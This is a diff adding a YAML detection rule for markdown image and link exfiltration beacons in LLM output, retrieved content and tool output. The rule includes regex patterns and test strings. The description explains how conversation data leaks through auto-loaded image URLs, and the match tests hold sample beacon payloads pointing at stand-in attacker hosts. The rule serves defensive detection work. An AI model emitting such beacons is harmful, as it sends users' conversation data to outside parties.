@@ -1,0 +1,25 @@
+id: AITDP-EXF-001
+title: Markdown image / link exfiltration beacon
+category: data_exfiltration
+severity: critical
+confidence: 0.9
+stages: [model_output, retrieved_content, tool_output]
+description: >
+  A markdown image or link whose URL carries query parameters — the standard
+  technique for exfiltrating conversation data via an auto-loaded image request.
+references:
+  owasp_llm: [LLM02, LLM01]
+  mitre_atlas: [AML.T0057]
+  cwe: [CWE-200]
+recommended_action: sanitize
+patterns:
+  - regex: '!\[[^\]]*\]\(\s*https?://[^\s)]+\?[^\s)]*[=%][^\s)]*\)'
+  - regex: '<img[^>]+src\s*=\s*["'']https?://[^"'']+\?[^"'']+["'']'
+tests:
+  match:
+    - "![loading](https://evil.example/pixel.png?data=eyJ1c2VyIjoi...)"
+    - '<img src="https://attacker.example/c.gif?q=secret%20stuff">'
+  no_match:
+    - "![logo](https://example.com/logo.png)"
+    - "See https://example.com/docs?page=2 for details."
+tags: [exfiltration, markdown, beacon]
